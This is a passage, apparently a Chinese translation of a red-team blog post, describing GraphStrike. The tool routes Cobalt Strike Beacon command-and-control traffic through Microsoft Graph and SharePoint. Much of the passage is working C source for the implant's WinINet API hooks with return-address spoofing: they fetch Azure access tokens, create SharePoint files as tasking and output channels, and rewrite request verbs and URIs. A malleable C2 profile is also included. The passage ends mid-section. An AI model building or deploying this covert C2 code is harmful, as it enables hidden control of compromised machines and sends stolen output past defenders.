确定了 Beacon 用于通信的库后，我们需要更深入地了解 Beacon 在此过程中调用的特定 API。我们关心的 WinINet 函数的一般流程以及它们对我们的目的的实用性总结如下：

| **Api** | **描述** |
| --- | --- |
| InternetConnectA | 打开指向特定网站的句柄（如 [https://graph.microsoft.com）](https://graph.microsoft.com)/) 。在此 API 调用中，我们指定使用 HTTPS 协议。 |
| HttpOpenRequestA | 使用 InternetConnectA 返回的句柄打开站点上特定 URI 的句柄。在此调用中，指定了请求动词（GET、POST 等）和 URI（例如“/me/drive/root:/FolderA/FileB.txt:/content” ）。 |
| HttpSendRequestA | 使用 HttpOpenRequestA 返回的句柄发送实际请求。此处指定请求标头和请求正文（可选）。 |
| InternetReadFile | 使用 HttpOpenRequestA 返回的句柄读取服务器从请求中返回的数据。 |

仅从对这些应用程序接口的简要描述中，我们就能发现操纵 Beacon 行为的机会。例如，通过挂接 HttpOpenRequestA，我们就可以操纵所使用的动词，从而发出 PUT 而不是 POST 请求。同样，在 HttpSendRequestA 中，我们可以操纵 Beacon 使用的请求头，以便在请求中发送有效的访问令牌。

另一个值得注意的地方是，Beacon 会按顺序调用这些 API；每次 http-get 或 http-post 循环都会先调用 InternetConnectA，然后再调用 HttpOpenRequestA、HttpSendRequestA，最后（如果服务器返回输出）再调用 InternetReadFile。这样，我们就能从逻辑上将这些 API 调用关联起来，也就是说，如果 Beacon 调用了 HttpSendRequestA，我就知道它是在之前的 HttpOpenRequestA 调用之后进行的，而且这两个调用都是 Beacon 中同一个 http-get 或 http-post 循环的一部分。

# Web 请求初始化

前面提到的需求之一是，我们需要 Beacon 能够获取自己的访问令牌。正如之前所讨论的，这就带来了一些挑战，因为它们是从 login.microsoft.com 获取的，而 Beacon 的程序设计是通过监听器调用 graph.microsoft.com。在确定我们可以在挂钩函数中运行任意代码后，我想知道我是否有可能在提出网络请求的同时提出一个完全独立的网络请求......。我没有任何技术理由认为我不能这样做，但我决定必须尽快验证这一功能，因为它对 GraphStrike 的成功至关重要。

[![](assets/1709614992-518ba9df08d24bbafbede8dc603140ef.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240302221156-d3c6e4aa-d89e-1.png)

实际上，当 Beacon 开始其 http-get 循环并调用我们提到的四个 WinINet API 时，在其中一个函数被钩住时，我想向 login.microsoft.com 发起一个完全独立的网络请求，以获取访问令牌。在研究我应该在哪里尝试实现这个功能时，我注意 HttpOpenRequestA 将 Beacon 的 http-get 请求的 URI 作为参数。该 URI 需要引用 SharePoint 中的一个唯一文件，我们将使用 Graph API 访问该文件。我们需要访问令牌才能使用 Graph API，因此我们必须尝试在此处发出 "外带 "网络请求。

我编写了一个函数 "MakeWebRequest"，以方便在项目的其他地方使用这种技术：

```plain
SECTION( D ) LPVOID MakeWebRequest(HANDLE hInternet, 
                                    PVOID site, 
                                    PVOID uri, 
                                    PVOID verb, 
                                    PVOID headers, 
                                    PVOID content, 
                                    struct MemAddrs* pMemAddrs)
{
    LPVOID lpResult = NULL;

    // Connect to site
    HINTERNET hSite = ( HINTERNET )SPOOF( pMemAddrs->Api.net.InternetConnectA, 
                                           pMemAddrs->Api.net.hNet, 
                                           pMemAddrs->Api.net.size, 
                                           hInternet, 
                                           site, 
                                           C_PTR( U_PTR( INTERNET_DEFAULT_HTTPS_PORT ) ), 
                                           NULL, 
                                           NULL, 
                                           C_PTR( U_PTR( INTERNET_SERVICE_HTTP ) ), 
                                           0, 
                                           C_PTR( U_PTR( (DWORD_PTR)NULL ) ) );

    if (hSite)
    {
        // Create http request 
        LPCSTR acceptTypes[] = { C_PTR ( OFFSET ( "*/*" ) ), NULL };
        HINTERNET hReq = ( HINTERNET )SPOOF( pMemAddrs->Api.net.HttpOpenRequestA, 
                                              pMemAddrs->Api.net.hNet, 
                                              pMemAddrs->Api.net.size, 
                                              hSite, 
                                              verb, 
                                              uri, 
                                              NULL, 
                                              NULL, 
                                              acceptTypes, 
                                              C_PTR( U_PTR( INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE ) ),
                                              0);

        if (hReq)
        {
            // Set headers + content length values
            DWORD headersLen = 0;
            DWORD contentLen = 0;
            if (headers != NULL)
                headersLen = (DWORD)pMemAddrs->Api.msvcrt.strlen(headers);
            if (content != NULL)
                contentLen = (DWORD)pMemAddrs->Api.msvcrt.strlen(content);

            // Send http request using specified headers and content
            if ((BOOL) U_PTR ( SPOOF( pMemAddrs->Api.net.HttpSendRequest, 
                                       pMemAddrs->Api.net.hNet, 
                                       pMemAddrs->Api.net.size, 
                                       C_PTR ( hReq ), 
                                       headers, 
                                       C_PTR ( U_PTR( headersLen ) ), 
                                       content, 
                                       C_PTR ( U_PTR ( contentLen ) ) ) 
                ) == TRUE)
            {
                // Allocate a buffer to receive response from server
                // This should really be allocated dynamically, but 5K is enough for the requests we are making.
                lpResult = pMemAddrs->Api.msvcrt.calloc(5000, sizeof(char));

                // Call InternetReadFile in a loop until we have read everything.  
                DWORD dwBytesRead = 0, currbytes_read;
                BOOL bKeepReading = TRUE;
                do
                {
                    bKeepReading = (BOOL) U_PTR ( SPOOF( pMemAddrs->Api.net.InternetReadFile, 
                                                          pMemAddrs->Api.net.hNet, 
                                                          pMemAddrs->Api.net.size, 
                                                          C_PTR ( hReq ), 
                                                          C_PTR ( lpResult + dwBytesRead ),
                                                          C_PTR ( U_PTR ( 5000 - dwBytesRead ) ), 
                                                          C_PTR ( U_PTR ( &currbytes_read ) ) ) );
                    dwBytesRead += currbytes_read;
                } while (bKeepReading && currbytes_read);
            }

            // Close handle to request
            SPOOF( pMemAddrs->Api.net.InternetCloseHandle, 
                    pMemAddrs->Api.net.hNet, 
                    pMemAddrs->Api.net.size, 
                    hReq );
        }

        // Close handle to site
        SPOOF( pMemAddrs->Api.net.InternetCloseHandle, 
                pMemAddrs->Api.net.hNet, 
                pMemAddrs->Api.net.size, 
                hSite);
    }

    return lpResult;
};
```

在 HttpOpenRequestA\_Hook 函数中，我组装了访问令牌请求所需的标头和内容，然后调用了 "MakeWebRequest"：

```plain
SECTION( D ) HINTERNET HttpOpenRequestA_Hook( HINTERNET hInternet, 
                                               LPCSTR lpszVerb, 
                                               LPCSTR lpszObjectName, 
                                               LPCSTR lpszVersion, 
                                               LPCSTR lpszReferrer, 
                                               LPCSTR *lplpszAcceptTypes,
                                               DWORD dwFlags, DWORD_PTR dwContext )
{
    HINTERNET       hResult = INVALID_HANDLE_VALUE;
    LARGE_INTEGER   currentTime, frequency;
    PVOID           verb, uri, tempUri, headers, content, response;
    size_t          reqSize;
    int             elapsedTime;
    CHAR            size[10] = {0};
    CHAR            id[100] = {0};

    ... Trimmed for Brevity ...

            // ------------------------------------ Get Access Token ---------------------------------------

            // Define headers to be used
            headers = C_PTR ( OFFSET ( "Host: login.microsoft.com\r\nContent-Type: application/x-www-form-urlencoded" ) );

            // Allocate and assemble uri
            reqSize = pMemAddrs->Api.msvcrt.strlen(TENANT_ID) + pMemAddrs->Api.msvcrt.strlen( C_PTR ( OFFSET ( "//oauth2/v2.0/token" ) ) ) + 1;
            tempUri = pMemAddrs->Api.msvcrt.calloc(reqSize, sizeof(char));
            pMemAddrs->Api.msvcrt.sprintf(tempUri, C_PTR ( OFFSET ( "/%s/oauth2/v2.0/token" ) ), TENANT_ID);

            // Allocate and assemble content
            reqSize = pMemAddrs->Api.msvcrt.strlen(APP_CLIENT_ID) + pMemAddrs->Api.msvcrt.strlen(APP_CLIENT_SECRET) + pMemAddrs->Api.msvcrt.strlen(GRAPH_ADDRESS) + 
                pMemAddrs->Api.msvcrt.strlen( C_PTR ( OFFSET ( "grant_type=client_credentials&client_id=&client_secret=&scope=https\%3A\%2F\%2F\%2F.default" ) ) ) + 1;
            content = pMemAddrs->Api.msvcrt.calloc(reqSize, sizeof(char));
            pMemAddrs->Api.msvcrt.sprintf(content, C_PTR ( OFFSET ( "grant_type=client_credentials&client_id=%s&client_secret=%s&scope=https%%3A%%2F%%2F%s%%2F.default" ) ), APP_CLIENT_ID, APP_CLIENT_SECRET, GRAPH_ADDRESS);

            // Make web request
            response = MakeWebRequest(pMemAddrs->hInternet, 
                                       C_PTR ( OFFSET ( "login.microsoft.com" ) ), 
                                       tempUri, 
                                       POST_VERB, 
                                       headers, 
                                       content, 
                                       pMemAddrs);
            if (!response)
                return INVALID_HANDLE_VALUE;  

            // Parse out returned auth token
            char* delimiter = C_PTR ( OFFSET ( "access_token\":\"" ) );
            char* accessToken = pMemAddrs->Api.msvcrt.strstr(response, delimiter) + pMemAddrs->Api.msvcrt.strlen(delimiter);

            // Null terminate accessToken to remove brackets and quotes
            pMemAddrs->Api.msvcrt.memset(accessToken + pMemAddrs->Api.msvcrt.strlen(accessToken) - 2, 0, 2);

    ... Trimmed for Brevity ...         
}
```

幸运的是，事实证明这种方法完全可行。在第 33 行，我们通过指定 Azure 应用程序 ID 和应用程序客户端秘密（也是应用程序的 "密码"）来组装内容缓冲区。第 36 行调用了 "MakeWebRequest"，并返回 PVOID 响应变量，其中包含我们需要的访问令牌。请记住，这段代码位于 HttpOpenRequestA\_Hook 函数中，每次 Beacon 启动 http-get 循环时都会调用该函数。这样，我们就有机会将 "获取访问令牌 "代码隐藏在条件要求后面，例如 "在您第一次请求时，以及在距离上次获取访问令牌超过 3100 秒时运行此代码"。由于 Azure 访问令牌的有效期为 3600 秒，我们可以确保 Beacon 在旧的访问令牌过期之前自动检索新的访问令牌。

# Beacon 数据和配置文件语言

熟悉 Cobalt Strike 的人都知道，，Beacon 可通过可塑配置文件进行高度定制。其中包含的设置会传播到 TS 生成的所有 Beacon，并控制广泛的行为。在这个阶段，我们关注的是与 Beacon 发送 C2 流量相关的设置。Beacon HTTP 事务表提供了在事务的每个步骤中发送的数据的更多信息：

| **Request** | **Component** | **Block** | **Data** |
| --- | --- | --- | --- |
| http-get | client | metadata | Session metadata |
| http-get | server | output | Beacon’s tasks |
| http-post | client | id  | Session ID |
| http-post | client | output | Beacon’s responses |
| http-post | server | output | Empty |

在上面的图表中，Beacon 是“客户端”。总之，Beacon 的每个 http-get 都必须包含有关该 Beacon/主机/进程的会话元数据（这是在 Cobalt Strike 客户端中填充数据的内容），而每个 http-post 都必须包含 Beacon 的会话 ID，这是一个唯一的多位数。TS 会使用每种请求类型中的这些数据来识别哪个灯塔在请求任务分配或发送输出。在 Cobalt Strike 配置文件中，"metadata"和 "ID "都是必填字段，在 http-get 或 http-post 请求中，可以选择如何发送这两个字段。这些选项包括将数据作为附加标头、参数，甚至附加到请求的 URI 中。Cobalt Strike 手册在[数据转换语言](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_profile-language.htm#_Toc65482839:~:text=these%20inverse%20statements.-,Data,-Transform%20Language)部分进一步介绍了这些自定义选项：

| **Statement** | **What** |
| --- | --- |
| header “header” | Store data in an HTTP header |
| parameter “key” | Store data in a URI parameter |
| print | Send data as a transaction body |
| uri-append | Append to URI |

与传统的 HTTP/HTTPS C2 的 Cobalt Strike 配置文件相比，GraphStrike 配置文件中的 http-config、http-get 和 http-post 部分非常简单。例如，Beacon 在其请求中没有定义要使用的“header”值，因为我们必须在运行时使用当前的访问令牌手动组装标头。这种简化的配置文件使得在 GraphLdr 设置的被钩住的函数中后续操作 Beacon 数据变得容易。

实际上，GraphStrike 并不真正需要 http-config 块，因为它控制了 Cobalt Strike Web 服务器如何响应请求。在 GraphStrike 模型中，TS 实际上是在响应来自 GraphStrike 服务器而不是 Beacon 的请求，因此所有这些通信都是在本地完成的，不需要任何形式的隐蔽或秘密行动。

在查看 http-get 和 http-post 块时，我们无法在配置文件中指定实际的 URI，因为每个 Beacon 都需要一个唯一的 URI，而这将在运行时创建。关于 Beacon 元数据或会话 ID 的任何额外、不必要的操作都是我们以后在 GraphStrike 服务器端要处理的事情，所以我们可以保持简单。Beacon 元数据是一个二进制块，但我们可以对其进行 base64url 编码，以便将其附加到 http-get 请求的 URI 中。会话 ID 可以以未经转换的形式附加到 http-post 请求的 URI 中。

在 TS 任务和 Beacon 输出方面，当 TS 有针对 Beacon 的任务时，我们指定它应该只是“打印”任务，或将其发送到响应的正文中。我们还不会操作或混淆这些数据（它们只是加密的二进制块）。类似地，当 Beacon 具有来自已完成任务的输出时，我们将指示它“打印”该输出，并将其以未经转换的形式发送到 http-post 请求的正文中。综合起来，GraphStrike 配置文件的 http-get 和 http-post 部分如下所示：

```plain
http-config {
    # This section all relates to how the Cobalt Strike web server responds.
    # It's all irrelevant for GraphStrike, since the TS is just responding to the GraphStrike server's requests.
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "Apache";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";
}

http-get {

    # We just need our URI to be something unique and recognizable in order for GraphStrike to parse out values
    set uri "/_";
    set verb "GET";

    client {

        metadata {
            base64url;
            uri-append;
        }
    }

    server {

        output {   
            print;
        }
    }
}

http-post {

    # We just need our URI to be something unique and recognizable in order for GraphStrike to parse out values
    set uri "/-_";
    set verb "POST";

    client {

        id {
            uri-append;         
        }

        output {
            print;
        }
    }

    server {

        output {
            print;
        }
    }
}
```

C2lint 可以用来可视化 Beacon 预编程的 http-get 和 http-post 请求的样子

[![](assets/1709614992-bed44749e49f6cf4ab8504eccf6b02ea.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240302221203-d8408900-d89e-1.png)

同样，默认请求非常简单且未混淆（更不用说对于 Graph API 来说是非功能性的）。通过以这种方式设置配置文件，我们将自己定位为能够在挂钩函数中解析和操作关键数据。例如，通过注意到 GET URI 以“/*”开头，POST URI 以“/-*”开头，我们可以简单地删除这些前置标识符，以便访问 Beacon 元数据以及会话 ID。示例 TS 任务（http-get 块，蓝色）和 Beacon 输出（http-post 块，红色）可以看作是打印在标题下方的乱码字符串。在使重要的 Beacon 数据变得易于访问之后，是时候尝试将其与 SharePoint 文件一起使用了。

# 格格不入

[![](assets/1709614992-272b637367b50c2d9f5a0e1137bad83f.gif)](https://xzfile.aliyuncs.com/media/upload/picture/20240302221232-e96fe752-d89e-1.gif)

我们的配置文件已经设置好，可以向我们提供 Beacon 的重要数据，现在是时候弄清楚如何使用 Graph API 和 SharePoint 文件了：

1.  为此 Beacon 创建唯一的文件以用于其任务分配和输出。
2.  将 Beacon 的识别信息与实际 C2 数据一起传达给 TS。

我不得不重申，正常的 Cobalt Strike HTTPS 通信和 GraphStrike 通信之间存在重大概念差异。为了帮助说明这一点，我将重用并稍微修改之前的图表：

[![](assets/1709614992-4babde78601baa0be94e3719e29d983e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240302221243-efcb8656-d89e-1.png)

每个红色椭圆形标识一个单独且完全独立的 HTTPS 请求；也就是说，这里不会像通常使用公共重定向器那样转发请求。此外，在 GraphStrike 中，不仅 Beacon 需要连接互联网，服务器端也必须连接以获取数据。这导致 Beacon 和 TS 之间没有真正的同步性。每一方在数据可用时发送数据，另一方必须不断检查/检索可用的新数据。这些因素综合起来导致我将两个 SharePoint 文件用于单个 Beacon；TS 将任务上传到其中，Beacon 从其中下载，Beacon 将输出上传到其中，GraphStrike 服务器从其中下载。

[![](assets/1709614992-cc215b363a5c0146162770d6d75f41dd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240302221248-f2e82b8c-d89e-1.png)

如前所述，TS 任务和 Beacon 输出将存储为 SharePoint 文件的实际内容，因此我们需要以某种方式“标记”这些文件，以便传达关联的 Beacon 元数据和会话 ID。查看 driveItem 资源的结构很有帮助（对于我们的目的而言，driveItem 与“文件”同义）。DriveItem 的大多数属性都是只读的，但有一些可修改的属性可以满足我们的目的。最明显且易于使用的是 driveItem 的名称，它是用户提供的任意字符串：

[![](assets/1709614992-915cd7f3279f35ed9586aba0e80b5663.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240302221252-f53e5370-d89e-1.png)

在规避/避免 IOC 方面还有更多工作可以做，但为了公开发布和简单起见，我选择使用 Beacon 的 base64url 编码元数据作为 TS 任务文件的名称。对于 Beacon 输出文件，使用 Beacon 元数据和 Beacon 会话 ID，并用预定义的分隔符（“pD9-tk”）分隔，以便我们稍后可以解析这两个值。SharePoint 中每个文件的示例如下所示：

[![](assets/1709614992-d0abf1e8982e537e1b48ecba97bd882c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240302221259-f9a527cc-d89e-1.png)

对于这个特定的 Beacon，相关信息可以总结如下：

| **条目** | **值** |
| --- | --- |
| TS 任务文件名 | AMFTYYnvh-NZ7q87nb32BV03vz-tP1vaoxmfdwKTeba6D7azteJONYntyP79j7L7-QWynYagPhJ0qgBk7albtTKi4tmJlfIBfcoVaHcmMehvzQcZar1OC1hQj64cXfBDSRs-u2Sp9P0GNglZejsQ7BcCA-3cirbd0wInvbhStW0 |
| Beacon 输出文件名 | AMFTYYnvh-NZ7q87nb32BV03vz-tP1vaoxmfdwKTeba6D7azteJONYntyP79j7L7-QWynYagPhJ0qgBk7albtTKi4tmJlfIBfcoVaHcmMehvzQcZar1OC1hQj64cXfBDSRs-u2Sp9P0GNglZejsQ7BcCA-3cirbd0wInvbhStW0pD9-tK1123716960 |
| Beacon 元数据 | AMFTYYnvh-NZ7q87nb32BV03vz-tP1vaoxmfdwKTeba6D7azteJONYntyP79j7L7-QWynYagPhJ0qgBk7albtTKi4tmJlfIBfcoVaHcmMehvzQcZar1OC1hQj64cXfBDSRs-u2Sp9P0GNglZejsQ7BcCA-3cirbd0wInvbhStW0 |
| 分隔符 | pD9-tK |
| Beacon 会话 ID | 1123716960 |

通过这样组织事情，我们：

1.  将所需的 Beacon 元数据和会话 ID 与每个 http-get 和 http-post 请求相关联。
2.  可以将 SharePoint 中的 TS 任务文件和 Beacon 输出文件关联为属于同一 Beacon（因为在两个文件名中都可以找到 Beacon 元数据）。

为了将其映射到 Beacon 的 HTTP 事务，Beacon 将向 TS 任务文件发出 http-get 请求以下载文件内容。对 http-get 的服务器响应来自托管 SharePoint 文件（而不是 TS）的 Microsoft 服务器，并包含之前由 GraphStrike 服务器上传的 TS 任务。由于 Beacon 的独特元数据用作文件名，GraphStrike 知道 Cobalt Strike 中发布的针对该特定 Beacon 的所有任务都应上传到治理。

当 Beacon 获得任务输出时，它会启动 http-post 循环，将数据上传到 Beacon 输出文件。Beacon 实际上并不对 http-post 请求的服务器输出做任何事情，也不关心服务器输出，因此我们可以简单地丢弃 Microsoft 服务器响应此请求的内容。然后，GraphStrike 服务器可以下载 Beacon 输出文件中存储的数据，通过按预定义的分隔符拆分来查找文件名中的 Beacon 会话 ID，然后将此数据传送到 TS 进行处理。

Beacon 负责在 SharePoint 中创建这两个文件，因为它的元数据和会话 ID 是在运行时确定的。执行此操作的代码也驻留在 HttpOpenRequestA\_Hook 函数中，并且在逻辑上是有限制的，因此 Beacon 只能在 SharePoint 中创建一次新文件；TS Tasking 文件是在第一个 http-get 循环中创建的，而输出文件则是在第一个 http-post 循环中创建的。

TS 任务文件创建：

```plain
... Trimmed for Brevity ...

// If this is the first GET request for the Beacon, we need to create the TS output file for the Beacon to read from. 
if (pMemAddrs->firstGet)
{
    // ------------------------------------ Upload new file for TS tasking ---------------------------------------

    // Assemble URI to create new file in SharePoint using the Beacon metadata as a name
    tempUri = C_PTR ( pMemAddrs->Api.msvcrt.calloc(1000, sizeof(char)) );
    LPCSTR fileName = pMemAddrs->Api.msvcrt.strstr(lpszObjectName, HTTP_GET_PREFIX ) + pMemAddrs->Api.msvcrt.strlen(HTTP_GET_PREFIX);
    pMemAddrs->Api.msvcrt.sprintf(tempUri, C_PTR ( OFFSET ( "%s/root:/%s:/content" ) ), SHAREPOINT_ADDRESS, fileName );

    // Store metaData to be used later to create the Beacon output channel as well 
    pMemAddrs->metaData = (char*)pMemAddrs->Api.msvcrt.calloc(pMemAddrs->Api.msvcrt.strlen(fileName) + 1, sizeof(char));
    pMemAddrs->Api.msvcrt.strcpy(pMemAddrs->metaData, fileName);

    response = MakeWebRequest(pMemAddrs->hInternet, GRAPH_ADDRESS, tempUri, PUT_VERB, pMemAddrs->httpPostHeaders, NULL, pMemAddrs );
    if (!response)
        return INVALID_HANDLE_VALUE;

    // Parse out fileId from response
    ParseValue((char*)response, (char*)C_PTR ( OFFSET ( "id\":\"" ) ), id, 100, FALSE, pMemAddrs);

    // Assemble httpGetUri that will be used for subsequent Beacon comms
    reqSize = pMemAddrs->Api.msvcrt.strlen(SHAREPOINT_ADDRESS) + pMemAddrs->Api.msvcrt.strlen(id) + pMemAddrs->Api.msvcrt.strlen(C_PTR ( OFFSET ( "/items//content" ) ) + 1);
    pMemAddrs->httpGetUri = pMemAddrs->Api.msvcrt.calloc(reqSize, sizeof(char));
    pMemAddrs->Api.msvcrt.sprintf(pMemAddrs->httpGetUri, C_PTR ( OFFSET ( "%s/items/%s/content") ), SHAREPOINT_ADDRESS, id);

    // Free buffers
    pMemAddrs->Api.msvcrt.free(response);
    pMemAddrs->Api.msvcrt.free(tempUri);

    // Toggle firstGet to false so we don't repeat this loop.
    pMemAddrs->firstGet = FALSE;
}

... Trimmed for Brevity ...
```

Beacon 输出文件创建：

```plain
... Trimmed for Brevity ...

// If this is the first POST request for the Beacon, create the Beacon output file for the TS to read from.
if ( pMemAddrs->firstPost && !pMemAddrs->activeGet)
{        
    // ------------------------------------ Upload new file for Beacon output --------------------------------------- 

    // Assemble URI to create new file in SharePoint using the Beacon metadata + beaconId as a name.
    tempUri = C_PTR ( pMemAddrs->Api.msvcrt.calloc(1000, sizeof(char)) );
    LPCSTR beaconId = pMemAddrs->Api.msvcrt.strstr(lpszObjectName, HTTP_POST_PREFIX ) + pMemAddrs->Api.msvcrt.strlen(HTTP_POST_PREFIX);
    pMemAddrs->Api.msvcrt.sprintf(tempUri, C_PTR ( OFFSET ( "%s/root:/%s%s%s:/content" ) ), SHAREPOINT_ADDRESS, pMemAddrs->metaData, BID_DELIMITER, beaconId );

    // Send request
    response = MakeWebRequest(pMemAddrs->hInternet, GRAPH_ADDRESS, tempUri, PUT_VERB, pMemAddrs->httpPostHeaders, NULL, pMemAddrs ); 

    // Parse out fileId from response
    ParseValue((char*)response, (char*)C_PTR ( OFFSET ( "id\":\"" ) ), id, 100, FALSE, pMemAddrs);

    // Assemble httpPostUri that will be used for subsequent Beacon comms
    reqSize = pMemAddrs->Api.msvcrt.strlen(SHAREPOINT_ADDRESS) + pMemAddrs->Api.msvcrt.strlen(id) + pMemAddrs->Api.msvcrt.strlen(C_PTR ( OFFSET ( "/items//content" ) ) + 1);
    pMemAddrs->httpPostUri = pMemAddrs->Api.msvcrt.calloc(reqSize, sizeof(char));
    pMemAddrs->Api.msvcrt.sprintf(pMemAddrs->httpPostUri, C_PTR ( OFFSET ( "%s/items/%s/content") ), SHAREPOINT_ADDRESS, id);

    // Assemble httpPostCheckSizeUrl by trimming off "/content" from the end of the httpPostUri.
    int copyLen = (PVOID)(pMemAddrs->Api.msvcrt.strstr(pMemAddrs->httpPostUri, C_PTR ( OFFSET ( "/content" ) ))) - pMemAddrs->httpPostUri;
    pMemAddrs->httpPostCheckSizeUrl = pMemAddrs->Api.msvcrt.calloc(copyLen + 1, sizeof(char));
    pMemAddrs->Api.msvcrt.memcpy(pMemAddrs->httpPostCheckSizeUrl, pMemAddrs->httpPostUri, copyLen);

    // Free buffers
    pMemAddrs->Api.msvcrt.free(tempUri);
    pMemAddrs->Api.msvcrt.free(response);

    // Toggle firstPost to false so we don't repeat this loop.
    pMemAddrs->firstPost = FALSE; 
}

... Trimmed for Brevity ...
```

这两个块执行类似的操作，都是通过使用前面讨论过的值来组合文件名，从而在 SharePoint 中创建新文件。使用 "MakeWebRequest "发送请求后，新创建文件的 SharePoint ID 将被解析，以用于 Beacon 的所有后续请求。firstGet "和 "firstPost "布尔值控制着这些代码块是否运行，并且在运行时从 TRUE 切换到 FALSE，这样对 HttpOpenRequestA\_Hook 的后续调用就不会导致创建额外的文件。

# 修改 API 调用参数和非 GraphStrike Beacon

本节内容简短，但却非常重要。我曾多次提到，AceLdr 实现的 IAT 挂钩功能使我们有能力调整和摆弄 Beacon 发送到挂钩 API 的参数。下面的代码片段再次来自 HttpOpenRequestA\_Hook 函数，从中可以看到这一功能的实现和影响：

```plain
SECTION( D ) HINTERNET HttpOpenRequestA_Hook( HINTERNET hInternet, 
                                                LPCSTR lpszVerb, 
                                                LPCSTR lpszObjectName, 
                                                LPCSTR lpszVersion, 
                                                LPCSTR lpszReferrer, 
                                                LPCSTR *lplpszAcceptTypes, 
                                                DWORD dwFlags, 
                                                DWORD_PTR dwContext )
{
    HINTERNET       hResult = INVALID_HANDLE_VALUE;

    ... Trimmed for Brevity ...

    // Only run the following if this is a GraphStrike Beacon
    if (pMemAddrs->graphStrike)

        // Determine whether this call to HttpOpenRequestA is for a http-get or http-post request
        if (pMemAddrs->Api.msvcrt.strcmp(lpszVerb, C_PTR ( OFFSET ( "GET" ) ) ) == 0)
            pMemAddrs->activeGet = TRUE;
        else
            pMemAddrs->activeGet = FALSE;

        ... Trimmed for Brevity ...

        // Set verb and uri to be used with HttpOpenRequest call.
        // Must be done here so that httpGetUri + httpPostUri are populated first
        if ( pMemAddrs->activeGet)
        {            
            verb = GET_VERB;
            uri = pMemAddrs->httpGetUri;
        }
        else
        {
            verb = PUT_VERB;
            uri = pMemAddrs->httpPostUri;
        }

        // Finally send request.
        hResult =  ( HINTERNET )SPOOF( pMemAddrs->Api.net.HttpOpenRequestA,
                                        pMemAddrs->Api.net.hNet, 
                                        pMemAddrs->Api.net.size, 
                                        hInternet, 
                                        verb, 
                                        uri, 
                                        C_PTR( lpszVersion ), 
                                        C_PTR( lpszReferrer ), 
                                        C_PTR( lplpszAcceptTypes ), 
                                        C_PTR( U_PTR( dwFlags ) ), 
                                        C_PTR( U_PTR( dwContext ) ) );
    }

    // If not a GraphStrike Beacon, make a normal call to HttpOpenRequestA
    else
        hResult =  ( HINTERNET )SPOOF( pMemAddrs->Api.net.HttpOpenRequestA, 
                                        pMemAddrs->Api.net.hNet, 
                                        pMemAddrs->Api.net.size, 
                                        hInternet, 
                                        C_PTR( lpszVerb ), 
                                        C_PTR( lpszObjectName ), 
                                        C_PTR( lpszVersion ), 
                                        C_PTR( lpszReferrer ), 
                                        C_PTR( lplpszAcceptTypes ), 
                                        C_PTR( U_PTR( dwFlags ) ),
                                        C_PTR( U_PTR( dwContext ) ) );

    return hResult;
};
```

在代码的第 18 行，我们将检查 Beacon 传递给 HttpOpenRequestA\_Hook 的 "lpszVerb "变量，以确定对 HttpOpenRequestA 的调用是 http-get 循环的一部分，还是 http-post 循环的一部分。我们在配置文件中为 Beacon 的 http-get 和 http-post 请求设置了动词，因此我们可以根据 Beacon 尝试使用的动词来判断这是哪种请求。这种判断在第 27 行使用，请求类型决定了在真正调用 HttpOpenRequestA 时作为参数使用的 "verb "和 "uri"。在这里，我们利用了对 Beacon 提供的参数的控制，使用了在 SharePoint 中首次创建文件时组装的上传 URI，并在 http-post 请求中用 "PUT "代替了 "POST"，这样我们就可以使用 Graph API 的 Upload 方法。真正的 API 最终会在第 39 行调用，使用我们自定义的 "verb "和 "uri "参数代替 Beacon 指定的原始 "lpszVerb "和 "lpszObjectName "参数。

GraphLdr 还支持使用正常的 Cobalt Strike HTTPS Beacon。在导入 "graphstrike.cna" 时，Cobalt Strike 创建的所有 Beacon 都将使用 GraphLdr 作为 Beacon 的 UDRL，但只有当 Beacon 的主机设置为 "graph.microsoft.com "时，我们才真正需要在 GraphLdr 中完成所有额外工作。至于 Beacon 是 GraphStrike 还是标准 HTTPS，我们将在 InternetConnectA\_Hook 函数中通过检查 Beacon 指定的 "lpszServerName "参数来确定。其结果将在上述代码段的第 15 行中使用，在该行中，我们将根据此布尔值进行分支。对于普通 HTTPS Beacon，真正的 API 会在第 54 行调用，并使用 Beacon 发送的所有未经修改的原始参数（尽管我们仍在使用 AceLdr 的返回地址欺骗功能）。

-   虽然 GraphStrike 支持在使用 GraphStrike 信号的同时使用标准 HTTPS 信号，但 Cobalt Strike 配置文件还不够灵活，因此这一点并不实用。4.9 版本增加了主机配置文件，但这些配置文件只允许自定义 URI、标头和参数，还不支持按主机指定 Beacon 元数据和会话 ID 的发送方式，也不支持 TS 的回复方式。这就导致标准 HTTPS Beacon 使用了前面 "Beacon 数据和配置文件语言 "部分讨论过的未加混淆的选项。我已经与 Cobalt Strike 团队讨论过这个问题，他们希望在 2024 年的某个时候扩展对这种自定义级别的支持。

# 同步与异步

我已经详细讨论了 GraphStrike 的通信模型，本质上是异步的以及随之而来的挑战，但还有一个问题必须讨论和缓解。Beacon 不断向 TS 任务文件发出 GET 请求以下载任务，GraphStrike 服务器类似地向 Beacon 输出文件发出 GET 请求以下载输出；无论该文件中存储了什么，他们都会采取并采取行动。这提出了两种问题场景：

1.  在 Cobalt Strike 中发出命令并上传到 TS 任务分配文件。Beacon 下载命令，运行它，然后发送它的输出。当 Beacon 完成休眠后，它会再次从 TS 任务文件下载并运行相同的命令，因为 Cobalt Strike 没有发出额外的命令来“擦除”任务文件。
2.  在另一方成功下载第一次上传的数据之前，Beacon 或 GraphStrike 服务器会两次上传到 SharePoint 中各自的文件。这会导致数据丢失并破坏诸如依赖于来回顺序数据交换的 SOCKS 代理之类的功能。

幸运的是，对于这两种情况都有一个单一的解决方案。当 Beacon 向 TS 任务文件发出 GET 请求并返回数据时，会重复调用 InternetReadFile，直到没有更多数据可供读取。当然，因为我们已经挂钩了这个 API，所以我们的自定义函数会被调用，其中我们会等到读取所有响应数据，然后再将空白文件上传到 TS 任务文件。这可以在以下代码片段的第 32 行看到，其中调用了“MakeWebRequest”。请注意“httpGetUri”和“PUT\_VERB”一起使用的独特组合：

```plain
